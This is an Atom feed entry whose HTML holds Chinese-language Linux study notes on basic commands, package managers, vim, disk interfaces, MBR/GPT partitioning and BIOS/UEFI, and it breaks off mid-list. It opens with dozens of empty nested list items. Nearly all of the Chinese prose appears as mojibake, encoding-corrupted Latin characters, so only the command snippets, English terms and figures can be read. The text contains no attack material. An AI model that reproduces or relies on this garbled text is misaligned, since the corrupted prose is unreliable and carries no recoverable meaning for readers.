    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="ä¸€ã€å¸¸ç”¨æ“ä½œä»¥åŠæ¦‚å¿µ" tabindex="-1"> ä¸€ã€å¸¸ç”¨æ“ä½œä»¥åŠæ¦‚å¿µ</h1>
<h2 id="å¿«æ·é”®" tabindex="-1"> å¿«æ·é”®</h2>
<ul>
<li>Tabï¼šå‘½ä»¤å’Œæ–‡ä»¶åè¡¥å…¨ï¼›</li>
<li>Ctrl+Cï¼šä¸­æ–­æ­£åœ¨è¿è¡Œçš„ç¨‹åºï¼›</li>
<li>Ctrl+Dï¼šç»“æŸé”®ç›˜è¾“å…¥ï¼ˆEnd Of Fileï¼ŒEOFï¼‰</li>
</ul>
<h2 id="æ±‚åŠ©" tabindex="-1"> æ±‚åŠ©</h2>
<h3 id="_1-help" tabindex="-1"> 1. --help</h3>
<p>æŒ‡ä»¤çš„åŸºæœ¬ç”¨æ³•ä¸é€‰é¡¹ä»‹ç»ã€‚</p>
<h3 id="_2-man" tabindex="-1"> 2. man</h3>
<p>man æ˜¯ manual çš„ç¼©å†™ï¼Œå°†æŒ‡ä»¤çš„å…·ä½“ä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<p>å½“æ‰§è¡Œ <code>man date</code> æ—¶ï¼Œæœ‰ DATE(1) å‡ºç°ï¼Œå…¶ä¸­çš„æ•°å­—ä»£è¡¨æŒ‡ä»¤çš„ç±»å‹ï¼Œå¸¸ç”¨çš„æ•°å­—åŠå…¶ç±»å‹å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">ä»£å·</th>
<th>ç±»å‹</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td>ç”¨æˆ·åœ¨ shell ç¯å¢ƒä¸­å¯ä»¥æ“ä½œçš„æŒ‡ä»¤æˆ–è€…å¯æ‰§è¡Œæ–‡ä»¶</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td>é…ç½®æ–‡ä»¶</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td>ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥ä½¿ç”¨çš„ç®¡ç†æŒ‡ä»¤</td>
</tr>
</tbody>
</table>
<h3 id="_3-info" tabindex="-1"> 3. info</h3>
<p>info ä¸ man ç±»ä¼¼ï¼Œä½†æ˜¯ info å°†æ–‡æ¡£åˆ†æˆä¸€ä¸ªä¸ªé¡µé¢ï¼Œæ¯ä¸ªé¡µé¢å¯ä»¥è¿›è¡Œè·³è½¬ã€‚</p>
<h3 id="_4-doc" tabindex="-1"> 4. doc</h3>
<p>/usr/share/doc å­˜æ”¾ç€è½¯ä»¶çš„ä¸€æ•´å¥—è¯´æ˜æ–‡ä»¶ã€‚</p>
<h2 id="å…³æœº" tabindex="-1"> å…³æœº</h2>
<h3 id="_1-who" tabindex="-1"> 1. who</h3>
<p>åœ¨å…³æœºå‰éœ€è¦å…ˆä½¿ç”¨ who å‘½ä»¤æŸ¥çœ‹æœ‰æ²¡æœ‰å…¶å®ƒç”¨æˆ·åœ¨çº¿ã€‚</p>
<h3 id="_2-sync" tabindex="-1"> 2. sync</h3>
<p>ä¸ºäº†åŠ å¿«å¯¹ç£ç›˜æ–‡ä»¶çš„è¯»å†™é€Ÿåº¦ï¼Œä½äºå†…å­˜ä¸­çš„æ–‡ä»¶æ•°æ®ä¸ä¼šç«‹å³åŒæ­¥åˆ°ç£ç›˜ä¸Šï¼Œå› æ­¤å…³æœºä¹‹å‰éœ€è¦å…ˆè¿›è¡Œ sync åŒæ­¥æ“ä½œã€‚</p>
<h3 id="_3-shutdown" tabindex="-1"> 3. shutdown</h3>
<div><pre><code># shutdown [-krhc] æ—¶é—´ [ä¿¡æ¯]
-k ï¼š ä¸ä¼šå…³æœºï¼Œåªæ˜¯å‘é€è­¦å‘Šä¿¡æ¯ï¼Œé€šçŸ¥æ‰€æœ‰åœ¨çº¿çš„ç”¨æˆ·
-r ï¼š å°†ç³»ç»Ÿçš„æœåŠ¡åœæ‰åå°±é‡æ–°å¯åŠ¨
-h ï¼š å°†ç³»ç»Ÿçš„æœåŠ¡åœæ‰åå°±ç«‹å³å…³æœº
-c ï¼š å–æ¶ˆå·²ç»åœ¨è¿›è¡Œçš„ shutdown æŒ‡ä»¤å†…å®¹
</code></pre></div><h2 id="path" tabindex="-1"> PATH</h2>
<p>å¯ä»¥åœ¨ç¯å¢ƒå˜é‡ PATH ä¸­å£°æ˜å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼Œè·¯å¾„ä¹‹é—´ç”¨ : åˆ†éš”ã€‚</p>
<div><pre><code>/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/dmtsai/.local/bin:/home/dmtsai/bin
</code></pre></div><h2 id="sudo" tabindex="-1"> sudo</h2>
<p>sudo å…è®¸ä¸€èˆ¬ç”¨æˆ·ä½¿ç”¨ root å¯æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¸è¿‡åªæœ‰åœ¨ /etc/sudoers é…ç½®æ–‡ä»¶ä¸­æ·»åŠ çš„ç”¨æˆ·æ‰èƒ½ä½¿ç”¨è¯¥æŒ‡ä»¤ã€‚</p>
<h2 id="åŒ…ç®¡ç†å·¥å…·" tabindex="-1"> åŒ…ç®¡ç†å·¥å…·</h2>
<p>RPM å’Œ DPKG ä¸ºæœ€å¸¸è§çš„ä¸¤ç±»è½¯ä»¶åŒ…ç®¡ç†å·¥å…·ï¼š</p>
<ul>
<li>RPM å…¨ç§°ä¸º Redhat Package Managerï¼Œæœ€æ—©ç”± Red Hat å…¬å¸åˆ¶å®šå®æ–½ï¼Œéšåè¢« GNU å¼€æºæ“ä½œç³»ç»Ÿæ¥å—å¹¶æˆä¸ºè®¸å¤š Linux ç³»ç»Ÿçš„æ—¢å®šè½¯ä»¶æ ‡å‡†ã€‚YUM åŸºäº RPMï¼Œå…·æœ‰ä¾èµ–ç®¡ç†å’Œè½¯ä»¶å‡çº§åŠŸèƒ½ã€‚</li>
<li>ä¸ RPM ç«äº‰çš„æ˜¯åŸºäº Debian æ“ä½œç³»ç»Ÿçš„ DEB è½¯ä»¶åŒ…ç®¡ç†å·¥å…· DPKGï¼Œå…¨ç§°ä¸º Debian Packageï¼ŒåŠŸèƒ½æ–¹é¢ä¸ RPM ç›¸ä¼¼ã€‚</li>
</ul>
<h2 id="å‘è¡Œç‰ˆ" tabindex="-1"> å‘è¡Œç‰ˆ</h2>
<p>Linux å‘è¡Œç‰ˆæ˜¯ Linux å†…æ ¸åŠå„ç§åº”ç”¨è½¯ä»¶çš„é›†æˆç‰ˆæœ¬ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">åŸºäºçš„åŒ…ç®¡ç†å·¥å…·</th>
<th style="text-align:center">å•†ä¸šå‘è¡Œç‰ˆ</th>
<th style="text-align:center">ç¤¾åŒºå‘è¡Œç‰ˆ</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">RPM</td>
<td style="text-align:center">Red Hat</td>
<td style="text-align:center">Fedora / CentOS</td>
</tr>
<tr>
<td style="text-align:center">DPKG</td>
<td style="text-align:center">Ubuntu</td>
<td style="text-align:center">Debian</td>
</tr>
</tbody>
</table>
<h2 id="vim-ä¸‰ä¸ªæ¨¡å¼" tabindex="-1"> VIM ä¸‰ä¸ªæ¨¡å¼</h2>
<ul>
<li>ä¸€èˆ¬æŒ‡ä»¤æ¨¡å¼ï¼ˆCommand modeï¼‰ï¼šVIM çš„é»˜è®¤æ¨¡å¼ï¼Œå¯ä»¥ç”¨äºç§»åŠ¨æ¸¸æ ‡æŸ¥çœ‹å†…å®¹ï¼›</li>
<li>ç¼–è¾‘æ¨¡å¼ï¼ˆInsert modeï¼‰ï¼šæŒ‰ä¸‹ &quot;i&quot; ç­‰æŒ‰é”®ä¹‹åè¿›å…¥ï¼Œå¯ä»¥å¯¹æ–‡æœ¬è¿›è¡Œç¼–è¾‘ï¼›</li>
<li>æŒ‡ä»¤åˆ—æ¨¡å¼ï¼ˆBottom-line modeï¼‰ï¼šæŒ‰ä¸‹ &quot;:&quot; æŒ‰é”®ä¹‹åè¿›å…¥ï¼Œç”¨äºä¿å­˜é€€å‡ºç­‰æ“ä½œã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b5e9fa4d-78d3-4176-8273-756d970742c7.png" width="500"/> </div><br>
<p>åœ¨æŒ‡ä»¤åˆ—æ¨¡å¼ä¸‹ï¼Œæœ‰ä»¥ä¸‹å‘½ä»¤ç”¨äºç¦»å¼€æˆ–è€…ä¿å­˜æ–‡ä»¶ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">å‘½ä»¤</th>
<th style="text-align:center">ä½œç”¨</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">:w</td>
<td style="text-align:center">å†™å…¥ç£ç›˜</td>
</tr>
<tr>
<td style="text-align:center">:w!</td>
<td style="text-align:center">å½“æ–‡ä»¶ä¸ºåªè¯»æ—¶ï¼Œå¼ºåˆ¶å†™å…¥ç£ç›˜ã€‚åˆ°åº•èƒ½ä¸èƒ½å†™å…¥ï¼Œä¸ç”¨æˆ·å¯¹è¯¥æ–‡ä»¶çš„æƒé™æœ‰å…³</td>
</tr>
<tr>
<td style="text-align:center">:q</td>
<td style="text-align:center">ç¦»å¼€</td>
</tr>
<tr>
<td style="text-align:center">:q!</td>
<td style="text-align:center">å¼ºåˆ¶ç¦»å¼€ä¸ä¿å­˜</td>
</tr>
<tr>
<td style="text-align:center">:wq</td>
<td style="text-align:center">å†™å…¥ç£ç›˜åç¦»å¼€</td>
</tr>
<tr>
<td style="text-align:center">:wq!</td>
<td style="text-align:center">å¼ºåˆ¶å†™å…¥ç£ç›˜åç¦»å¼€</td>
</tr>
</tbody>
</table>
<h2 id="gnu" tabindex="-1"> GNU</h2>
<p>GNU è®¡åˆ’ï¼Œè¯‘ä¸ºé©å¥´è®¡åˆ’ï¼Œå®ƒçš„ç›®æ ‡æ˜¯åˆ›å»ºä¸€å¥—å®Œå…¨è‡ªç”±çš„æ“ä½œç³»ç»Ÿï¼Œç§°ä¸º GNUï¼Œå…¶å†…å®¹è½¯ä»¶å®Œå…¨ä»¥ GPL æ–¹å¼å‘å¸ƒã€‚å…¶ä¸­ GPL å…¨ç§°ä¸º GNU é€šç”¨å…¬å…±è®¸å¯åè®®ï¼ˆGNU General Public Licenseï¼‰ï¼ŒåŒ…å«äº†ä»¥ä¸‹å†…å®¹ï¼š</p>
<ul>
<li>ä»¥ä»»ä½•ç›®çš„è¿è¡Œæ­¤ç¨‹åºçš„è‡ªç”±ï¼›</li>
<li>å†å¤åˆ¶çš„è‡ªç”±ï¼›</li>
<li>æ”¹è¿›æ­¤ç¨‹åºï¼Œå¹¶å…¬å¼€å‘å¸ƒæ”¹è¿›çš„è‡ªç”±ã€‚</li>
</ul>
<h2 id="å¼€æºåè®®" tabindex="-1"> å¼€æºåè®®</h2>
<ul>
<li><a href="https://choosealicense.com/" target="_blank" rel="noopener noreferrer">Choose an open source license</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2011/05/how_to_choose_free_software_licenses.html" target="_blank" rel="noopener noreferrer">å¦‚ä½•é€‰æ‹©å¼€æºè®¸å¯è¯ï¼Ÿ</a></li>
</ul>
<h1 id="äºŒã€ç£ç›˜" tabindex="-1"> äºŒã€ç£ç›˜</h1>
<h2 id="ç£ç›˜æ¥å£" tabindex="-1"> ç£ç›˜æ¥å£</h2>
<h3 id="_1-ide" tabindex="-1"> 1. IDE</h3>
<p>IDEï¼ˆATAï¼‰å…¨ç§° Advanced Technology Attachmentï¼Œæ¥å£é€Ÿåº¦æœ€å¤§ä¸º 133MB/sï¼Œå› ä¸ºå¹¶å£çº¿çš„æŠ—å¹²æ‰°æ€§å¤ªå·®ï¼Œä¸”æ’çº¿å ç”¨ç©ºé—´è¾ƒå¤§ï¼Œä¸åˆ©ç”µè„‘å†…éƒ¨æ•£çƒ­ï¼Œå·²é€æ¸è¢« SATA æ‰€å–ä»£ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/924914c0-660c-4e4a-bbc0-1df1146e7516.jpg" width="400"/> </div><br>
<h3 id="_2-sata" tabindex="-1"> 2. SATA</h3>
<p>SATA å…¨ç§° Serial ATAï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨ä¸²å£çš„ ATA æ¥å£ï¼ŒæŠ—å¹²æ‰°æ€§å¼ºï¼Œä¸”å¯¹æ•°æ®çº¿çš„é•¿åº¦è¦æ±‚æ¯” ATA ä½å¾ˆå¤šï¼Œæ”¯æŒçƒ­æ’æ‹”ç­‰åŠŸèƒ½ã€‚SATA-II çš„æ¥å£é€Ÿåº¦ä¸º 300MiB/sï¼Œè€Œ SATA-III æ ‡å‡†å¯è¾¾åˆ° 600MiB/s çš„ä¼ è¾“é€Ÿåº¦ã€‚SATA çš„æ•°æ®çº¿ä¹Ÿæ¯” ATA çš„ç»†å¾—å¤šï¼Œæœ‰åˆ©äºæœºç®±å†…çš„ç©ºæ°”æµé€šï¼Œæ•´ç†çº¿æä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f9f2a16b-4843-44d1-9759-c745772e9bcf.jpg" width=""/> </div><br>
<h3 id="_3-scsi" tabindex="-1"> 3. SCSI</h3>
<p>SCSI å…¨ç§°æ˜¯ Small Computer System Interfaceï¼ˆå°å‹æœºç³»ç»Ÿæ¥å£ï¼‰ï¼ŒSCSI ç¡¬ç›˜å¹¿ä¸ºå·¥ä½œç«™ä»¥åŠä¸ªäººç”µè„‘ä»¥åŠæœåŠ¡å™¨æ‰€ä½¿ç”¨ï¼Œå› æ­¤ä¼šä½¿ç”¨è¾ƒä¸ºå…ˆè¿›çš„æŠ€æœ¯ï¼Œå¦‚ç¢Ÿç‰‡è½¬é€Ÿ 15000rpm çš„é«˜è½¬é€Ÿï¼Œä¸”ä¼ è¾“æ—¶ CPU å ç”¨ç‡è¾ƒä½ï¼Œä½†æ˜¯å•ä»·ä¹Ÿæ¯”ç›¸åŒå®¹é‡çš„ ATA åŠ SATA ç¡¬ç›˜æ›´åŠ æ˜‚è´µã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f0574025-c514-49f5-a591-6d6a71f271f7.jpg" width=""/> </div><br>
<h3 id="_4-sas" tabindex="-1"> 4. SAS</h3>
<p>SASï¼ˆSerial Attached SCSIï¼‰æ˜¯æ–°ä¸€ä»£çš„ SCSI æŠ€æœ¯ï¼Œå’Œ SATA ç¡¬ç›˜ç›¸åŒï¼Œéƒ½æ˜¯é‡‡å–åºåˆ—å¼æŠ€æœ¯ä»¥è·å¾—æ›´é«˜çš„ä¼ è¾“é€Ÿåº¦ï¼Œå¯è¾¾åˆ° 6Gb/sã€‚æ­¤å¤–ä¹Ÿé€šè¿‡ç¼©å°è¿æ¥çº¿æ”¹å–„ç³»ç»Ÿå†…éƒ¨ç©ºé—´ç­‰ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6729baa0-57d7-4817-b3aa-518cbccf824c.jpg" width=""/> </div><br>
<h2 id="ç£ç›˜çš„æ–‡ä»¶å" tabindex="-1"> ç£ç›˜çš„æ–‡ä»¶å</h2>
<p>Linux ä¸­æ¯ä¸ªç¡¬ä»¶éƒ½è¢«å½“åšä¸€ä¸ªæ–‡ä»¶ï¼ŒåŒ…æ‹¬ç£ç›˜ã€‚ç£ç›˜ä»¥ç£ç›˜æ¥å£ç±»å‹è¿›è¡Œå‘½åï¼Œå¸¸è§ç£ç›˜çš„æ–‡ä»¶åå¦‚ä¸‹ï¼š</p>
<ul>
<li>IDE ç£ç›˜ï¼š/dev/hd[a-d]</li>
<li>SATA/SCSI/SAS ç£ç›˜ï¼š/dev/sd[a-p]</li>
</ul>
<p>å…¶ä¸­æ–‡ä»¶ååé¢çš„åºå·çš„ç¡®å®šä¸ç³»ç»Ÿæ£€æµ‹åˆ°ç£ç›˜çš„é¡ºåºæœ‰å…³ï¼Œè€Œä¸ç£ç›˜æ‰€æ’å…¥çš„æ’æ§½ä½ç½®æ— å…³ã€‚</p>
<h1 id="ä¸‰ã€åˆ†åŒº" tabindex="-1"> ä¸‰ã€åˆ†åŒº</h1>
<h2 id="åˆ†åŒºè¡¨" tabindex="-1"> åˆ†åŒºè¡¨</h2>
<p>ç£ç›˜åˆ†åŒºè¡¨ä¸»è¦æœ‰ä¸¤ç§æ ¼å¼ï¼Œä¸€ç§æ˜¯é™åˆ¶è¾ƒå¤šçš„ MBR åˆ†åŒºè¡¨ï¼Œä¸€ç§æ˜¯è¾ƒæ–°ä¸”é™åˆ¶è¾ƒå°‘çš„ GPT åˆ†åŒºè¡¨ã€‚</p>
<h3 id="_1-mbr" tabindex="-1"> 1. MBR</h3>
<p>MBR ä¸­ï¼Œç¬¬ä¸€ä¸ªæ‰‡åŒºæœ€é‡è¦ï¼Œé‡Œé¢æœ‰ä¸»è¦å¼€æœºè®°å½•ï¼ˆMaster boot record, MBRï¼‰åŠåˆ†åŒºè¡¨ï¼ˆpartition tableï¼‰ï¼Œå…¶ä¸­ä¸»è¦å¼€æœºè®°å½•å  446 bytesï¼Œåˆ†åŒºè¡¨å  64 bytesã€‚</p>
<p>åˆ†åŒºè¡¨åªæœ‰ 64 bytesï¼Œæœ€å¤šåªèƒ½å­˜å‚¨ 4 ä¸ªåˆ†åŒºï¼Œè¿™ 4 ä¸ªåˆ†åŒºä¸ºä¸»åˆ†åŒºï¼ˆPrimaryï¼‰å’Œæ‰©å±•åˆ†åŒºï¼ˆExtendedï¼‰ã€‚å…¶ä¸­æ‰©å±•åˆ†åŒºåªæœ‰ä¸€ä¸ªï¼Œå®ƒä½¿ç”¨å…¶å®ƒæ‰‡åŒºæ¥è®°å½•é¢å¤–çš„åˆ†åŒºè¡¨ï¼Œå› æ­¤é€šè¿‡æ‰©å±•åˆ†åŒºå¯ä»¥åˆ†å‡ºæ›´å¤šåˆ†åŒºï¼Œè¿™äº›åˆ†åŒºç§°ä¸ºé€»è¾‘åˆ†åŒºã€‚</p>
<p>Linux ä¹ŸæŠŠåˆ†åŒºå½“æˆæ–‡ä»¶ï¼Œåˆ†åŒºæ–‡ä»¶çš„å‘½åæ–¹å¼ä¸ºï¼šç£ç›˜æ–‡ä»¶å + ç¼–å·ï¼Œä¾‹å¦‚ /dev/sda1ã€‚æ³¨æ„ï¼Œé€»è¾‘åˆ†åŒºçš„ç¼–å·ä» 5 å¼€å§‹ã€‚</p>
<h3 id="_2-gpt" tabindex="-1"> 2. GPT</h3>
<p>æ‰‡åŒºæ˜¯ç£ç›˜çš„æœ€å°å­˜å‚¨å•ä½ï¼Œæ—§ç£ç›˜çš„æ‰‡åŒºå¤§å°é€šå¸¸ä¸º 512 bytesï¼Œè€Œæœ€æ–°çš„ç£ç›˜æ”¯æŒ 4 kã€‚GPT ä¸ºäº†å…¼å®¹æ‰€æœ‰ç£ç›˜ï¼Œåœ¨å®šä¹‰æ‰‡åŒºä¸Šä½¿ç”¨é€»è¾‘åŒºå—åœ°å€ï¼ˆLogical Block Address, LBAï¼‰ï¼ŒLBA é»˜è®¤å¤§å°ä¸º 512 bytesã€‚</p>
<p>GPT ç¬¬ 1 ä¸ªåŒºå—è®°å½•äº†ä¸»è¦å¼€æœºè®°å½•ï¼ˆMBRï¼‰ï¼Œç´§æ¥ç€æ˜¯ 33 ä¸ªåŒºå—è®°å½•åˆ†åŒºä¿¡æ¯ï¼Œå¹¶æŠŠæœ€åçš„ 33 ä¸ªåŒºå—ç”¨äºå¯¹åˆ†åŒºä¿¡æ¯è¿›è¡Œå¤‡ä»½ã€‚è¿™ 33 ä¸ªåŒºå—ç¬¬ä¸€ä¸ªä¸º GPT è¡¨å¤´çºªå½•ï¼Œè¿™ä¸ªéƒ¨ä»½çºªå½•äº†åˆ†åŒºè¡¨æœ¬èº«çš„ä½ç½®ä¸å¤§å°å’Œå¤‡ä»½åˆ†åŒºçš„ä½ç½®ï¼ŒåŒæ—¶æ”¾ç½®äº†åˆ†åŒºè¡¨çš„æ ¡éªŒç  (CRC32)ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥æ ¹æ®è¿™ä¸ªæ ¡éªŒç æ¥åˆ¤æ–­ GPT æ˜¯å¦æ­£ç¡®ã€‚è‹¥æœ‰é”™è¯¯ï¼Œå¯ä»¥ä½¿ç”¨å¤‡ä»½åˆ†åŒºè¿›è¡Œæ¢å¤ã€‚</p>
<p>GPT æ²¡æœ‰æ‰©å±•åˆ†åŒºæ¦‚å¿µï¼Œéƒ½æ˜¯ä¸»åˆ†åŒºï¼Œæ¯ä¸ª LBA å¯ä»¥åˆ† 4 ä¸ªåˆ†åŒºï¼Œå› æ­¤æ€»å…±å¯ä»¥åˆ† 4 * 32 = 128 ä¸ªåˆ†åŒºã€‚</p>
<p>MBR ä¸æ”¯æŒ 2.2 TB ä»¥ä¸Šçš„ç¡¬ç›˜ï¼ŒGPT åˆ™æœ€å¤šæ”¯æŒåˆ° 2<sup>33</sup> TB = 8 ZBã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/GUID_Partition_Table_Scheme.svg.png" width="400"/> </div><br>
<h2 id="å¼€æœºæ£€æµ‹ç¨‹åº" tabindex="-1"> å¼€æœºæ£€æµ‹ç¨‹åº</h2>
<h3 id="_1-bios" tabindex="-1"> 1. BIOS</h3>
<p>BIOSï¼ˆBasic Input/Output Systemï¼ŒåŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿï¼‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªå›ºä»¶ï¼ˆåµŒå…¥åœ¨ç¡¬ä»¶ä¸­çš„è½¯ä»¶ï¼‰ï¼ŒBIOS ç¨‹åºå­˜æ”¾åœ¨æ–­ç”µåå†…å®¹ä¸ä¼šä¸¢å¤±çš„åªè¯»å†…å­˜ä¸­ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/50831a6f-2777-46ea-a571-29f23c85cc21.jpg"/> </div><br>
<p>BIOS æ˜¯å¼€æœºçš„æ—¶å€™è®¡ç®—æœºæ‰§è¡Œçš„ç¬¬ä¸€ä¸ªç¨‹åºï¼Œè¿™ä¸ªç¨‹åºçŸ¥é“å¯ä»¥å¼€æœºçš„ç£ç›˜ï¼Œå¹¶è¯»å–ç£ç›˜ç¬¬ä¸€ä¸ªæ‰‡åŒºçš„ä¸»è¦å¼€æœºè®°å½•ï¼ˆMBRï¼‰ï¼Œç”±ä¸»è¦å¼€æœºè®°å½•ï¼ˆMBRï¼‰æ‰§è¡Œå…¶ä¸­çš„å¼€æœºç®¡ç†ç¨‹åºï¼Œè¿™ä¸ªå¼€æœºç®¡ç†ç¨‹åºä¼šåŠ è½½æ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒæ–‡ä»¶ã€‚</p>
<p>ä¸»è¦å¼€æœºè®°å½•ï¼ˆMBRï¼‰ä¸­çš„å¼€æœºç®¡ç†ç¨‹åºæä¾›ä»¥ä¸‹åŠŸèƒ½ï¼šé€‰å•ã€è½½å…¥æ ¸å¿ƒæ–‡ä»¶ä»¥åŠè½¬äº¤å…¶å®ƒå¼€æœºç®¡ç†ç¨‹åºã€‚è½¬äº¤è¿™ä¸ªåŠŸèƒ½å¯ä»¥ç”¨æ¥å®ç°å¤šé‡å¼•å¯¼ï¼Œåªéœ€è¦å°†å¦ä¸€ä¸ªæ“ä½œç³»ç»Ÿçš„å¼€æœºç®¡ç†ç¨‹åºå®‰è£…åœ¨å…¶å®ƒåˆ†åŒºçš„å¯åŠ¨æ‰‡åŒºä¸Šï¼Œåœ¨å¯åŠ¨å¼€æœºç®¡ç†ç¨‹åºæ—¶ï¼Œå°±å¯ä»¥é€šè¿‡é€‰å•é€‰æ‹©å¯åŠ¨å½“å‰çš„æ“ä½œç³»ç»Ÿæˆ–è€…è½¬äº¤ç»™å…¶å®ƒå¼€æœºç®¡ç†ç¨‹åºä»è€Œå¯åŠ¨å¦ä¸€ä¸ªæ“ä½œç³»ç»Ÿã€‚</p>
<p>ä¸‹å›¾ä¸­ï¼Œç¬¬ä¸€æ‰‡åŒºçš„ä¸»è¦å¼€æœºè®°å½•ï¼ˆMBRï¼‰ä¸­çš„å¼€æœºç®¡ç†ç¨‹åºæä¾›äº†ä¸¤ä¸ªé€‰å•ï¼šM1ã€M2ï¼ŒM1 æŒ‡å‘äº† Windows æ“ä½œç³»ç»Ÿï¼Œè€Œ M2 æŒ‡å‘å…¶å®ƒåˆ†åŒºçš„å¯åŠ¨æ‰‡åŒºï¼Œé‡Œé¢åŒ…å«äº†å¦å¤–ä¸€ä¸ªå¼€æœºç®¡ç†ç¨‹åºï¼Œæä¾›äº†ä¸€ä¸ªæŒ‡å‘ Linux çš„é€‰å•ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f900f266-a323-42b2-bc43-218fdb8811a8.jpg" width="600"/> </div><br>
<p>å®‰è£…å¤šé‡å¼•å¯¼ï¼Œæœ€å¥½å…ˆå®‰è£… Windows å†å®‰è£… Linuxã€‚å› ä¸ºå®‰è£… Windows æ—¶ä¼šè¦†ç›–æ‰ä¸»è¦å¼€æœºè®°å½•ï¼ˆMBRï¼‰ï¼Œè€Œ Linux å¯ä»¥é€‰æ‹©å°†å¼€æœºç®¡ç†ç¨‹åºå®‰è£…åœ¨ä¸»è¦å¼€æœºè®°å½•ï¼ˆMBRï¼‰æˆ–è€…å…¶å®ƒåˆ†åŒºçš„å¯åŠ¨æ‰‡åŒºï¼Œå¹¶ä¸”å¯ä»¥è®¾ç½®å¼€æœºç®¡ç†ç¨‹åºçš„é€‰å•ã€‚</p>
<h3 id="_2-uefi" tabindex="-1"> 2. UEFI</h3>
<p>BIOS ä¸å¯ä»¥è¯»å– GPT åˆ†åŒºè¡¨ï¼Œè€Œ UEFI å¯ä»¥ã€‚</p>
<h1 id="å››ã€æ–‡ä»¶ç³»ç»Ÿ" tabindex="-1"> å››ã€æ–‡ä»¶ç³»ç»Ÿ</h1>
<h2 id="åˆ†åŒºä¸æ–‡ä»¶ç³»ç»Ÿ" tabindex="-1"> åˆ†åŒºä¸æ–‡ä»¶ç³»ç»Ÿ</h2>
<p>å¯¹åˆ†åŒºè¿›è¡Œæ ¼å¼åŒ–æ˜¯ä¸ºäº†åœ¨åˆ†åŒºä¸Šå»ºç«‹æ–‡ä»¶ç³»ç»Ÿã€‚ä¸€ä¸ªåˆ†åŒºé€šå¸¸åªèƒ½æ ¼å¼åŒ–ä¸ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä½†æ˜¯ç£ç›˜é˜µåˆ—ç­‰æŠ€æœ¯å¯ä»¥å°†ä¸€ä¸ªåˆ†åŒºæ ¼å¼åŒ–ä¸ºå¤šä¸ªæ–‡ä»¶ç³»ç»Ÿã€‚</p>
<h2 id="ç»„æˆ" tabindex="-1"> ç»„æˆ</h2>
<p>æœ€ä¸»è¦çš„å‡ ä¸ªç»„æˆéƒ¨åˆ†å¦‚ä¸‹ï¼š</p>
<ul>
